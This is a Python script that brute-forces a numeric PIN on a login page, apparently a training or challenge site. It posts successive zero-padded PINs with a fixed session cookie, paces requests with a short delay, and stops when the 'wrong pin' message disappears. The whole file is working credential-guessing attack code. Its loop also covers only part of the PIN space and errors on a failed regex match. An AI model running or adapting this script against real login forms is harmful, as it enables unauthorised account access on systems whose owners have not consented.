#!/usr/bin/python3

import requests
import re
import time

url = "http://13.cybertrial.co.uk/login"
cookies = {"PHPSESSID": "jk54hdj7l4hju6javgg2qgrihe"}

r = requests.session()

for curPin in range(0, 1000):
	payload = {"formgo": "1", "pin": "{0:0=6d}".format(curPin)}
	print("Trying pin: " + payload["pin"])

	response = r.post(url, data=payload, cookies=cookies)

	check = re.search("you entered a wrong pin", response.text)

	with open("pin", 'w') as f:
		f.write(payload["pin"])
	
	if(check[0] == "you entered a wrong pin"):
		time.sleep(0.7)
	else:
		print(response.text)
		print("Working pin: " + payload["pin"])
		break;

